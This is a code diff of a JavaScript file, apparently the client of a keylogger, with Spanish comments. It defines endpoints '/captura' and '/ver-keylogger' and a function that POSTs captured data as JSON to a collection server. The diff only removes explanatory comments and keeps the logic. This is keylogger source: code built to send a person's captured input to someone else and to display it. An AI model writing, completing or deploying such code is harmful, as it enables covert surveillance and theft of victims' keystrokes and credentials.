@@ -10,8 +10,8 @@ const CONFIG = {
   
   // Objeto ENDPOINTS: Rutas específicas de cada endpoint
   ENDPOINTS: {
-    CAPTURA: '/captura',        // Ruta para enviar datos al servidor
-    VER_DATOS: '/ver-keylogger' // Ruta para visualizar datos capturados
+    CAPTURA: '/captura',
+    VER_DATOS: '/ver-keylogger'
   },
   
   // Función helper para construir la URL completa de un endpoint
@@ -32,18 +32,18 @@ async function enviarDatos(data) {
   try {
     // Hacer petición POST al endpoint /captura
     const response = await fetch(CONFIG.getEndpointUrl(CONFIG.ENDPOINTS.CAPTURA), {
-      method: 'POST',                          // Método HTTP
+      method: 'POST',
       headers: {
-        'Content-Type': 'application/json'     // Indicar que enviamos JSON
+        'Content-Type': 'application/json'
       },
-      body: JSON.stringify(data)               // Convertir objeto a JSON string
+      body: JSON.stringify(data)
     });
     
     // Verificar si la respuesta fue exitosa (status 200-299)
     if (response.ok) {
-      const result = await response.json();    // Parsear la respuesta JSON
+      const result = await response.json();
       console.log('✅ Datos enviados correctamente:', result);
-      return result;                           // Retornar el resultado
+      return result;
     } else {
       console.error('❌ Error al enviar datos:', response.status);
     }
